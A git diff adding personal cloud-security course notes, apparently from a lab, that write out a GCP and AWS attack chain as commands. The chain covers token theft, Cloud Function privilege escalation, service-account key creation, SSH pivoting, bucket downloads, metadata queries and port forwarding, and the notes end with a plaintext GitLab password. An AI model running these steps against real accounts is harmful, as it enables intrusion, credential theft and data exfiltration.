@@ -1,4 +1,4 @@
-# Course notes
+<img width="815" alt="image" src="https://github.com/securegns/notes/assets/24625106/e6343c1a-6fd2-49e0-b9e4-c4b371ebceed"># Course notes
 A cloud could also have ...
 - One account which can manage multiple accounts (ex. AWS orginisations)
 - Cross account access (ex. Azure guest users)
@@ -75,4 +75,77 @@ gcloud compute instances describe tesing-instance - get the ip of vm
 
 ssh -i ./gcp gcp@104.154.17.222
 - get the name of service account attached to that VM - gcloud auth list
+- gcloud auth print-access-token
+
+gcloud projects get-iam-policy sonic-airfoil-339910 --flatten="bindings[].members" --filter="bindings.members=serviceaccount:dsa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com" --format="value(bindings.role)"
+
+gcloud iam service-accounts list
+
+(using auth token of SSH VM's account) - gcloud functions deploy privesc-fun --timeout 539 --trigger-http --allow-unauthenticated --source function-source --runtime python37 --entry-point hello_world --service-account msa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com --access-token-file ./testing-instance.txt
+
+(Not working) - gcloud functions deploy privesc-fun --timeout 539 --trigger-http --allow-unauthenticated --source function-source --runtime python37 --entry-point hello_world --service-account msa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com --access-token-file ./vm-token.txt
+
+- https://us-central1-sonic-airfoil-339910.cloudfunctions.net/privesc-fun
+
+gcloud iam service-accounts get-iam-policy cpsa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com
+
+gcloud iam roles describe hivb3dzc --project sonic-airfoil-339910
+
+gcloud iam service-accounts keys create cpsa-key.json --iam-account=cpsa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com --access-token-file function_sess.txt 
+
+gcloud auth activate-service-account --key-file cpsa-key.json
+
+gcloud projects list
+
+gcloud projects get-iam-policy project-staging-344908 --flatten="bindings[].members" --format="table(bindings.role)" --filter="bindings.members:cpsa-service-account@sonic-airfoil-339910"
+
+gcloud config set project project-staging-344908
+
+gcloud compute instances list
+
+gcloud compute instances describe staging-instance
+
+gcloud compute firewall-rules list
+
+gcloud compute firewall-rules describe fw-allow-private-staging-vpc
+
+ssh-keygen - vm-oslogin - do this in Mac
+
+gcloud compute os-login ssh-keys add --key-file=vm-oslogin.pub - we get login profile name use it as username - do this in mac
+
+Copy the vm-oslogin file(not the .pub file) to testing-instance and do chmod 0600 vm-oslogin
+
+ssh -i vm-oslogin sa_106304274774497555045@34.170.123.186 - from inside testing-instance
+
+(now we are inside staging instance) get access token of SPN of that staging - gcloud auth print-access-token
+
+gcloud storage ls --access-token-file vm-staging-token.txt
+gcloud storage ls gs://staging-storage-metatech/ --access-token-file vm-staging-token.txt
+
+Download files = gcloud storage cp gs://staging-storage-metatech/roadmaps . --access-token-file staging.txt
+
+gcloud compute instances describe staging-instance - Now copy the private key file from output the .ppk file
+
+ --- AWS ---
+puttygen aws_ec2.ppk -O private-openssh -o ssh-jump-host.pem
+
+ssh -i ssh-jump-host.pem ec2-user@18.118.189.176
+
+(after login)
+
+aws sts get-caller-identity
+
+aws iam list-attached-role-policies --role-name jumphost-iam-access-role
+
+aws iam list-role-policies --role-name jumphost-iam-access-role
+
+aws iam get-role-policy --policy-name iam_policy --role-name jumphost-iam-access-role
+
+metadata - curl http://169.254.169.254/latest/user-data/
+
+nc -nv 10.20.1.220 80 - from inside ec2 we can see git lab is open
+
+sudo ssh -L 127.0.0.1:80:10.20.1.220:80 -i ./ssh-jump-host.pem ec2-user@18.118.189.176 - port forward to access gitlab
+
+gns, Password@123 - gitlab password
 
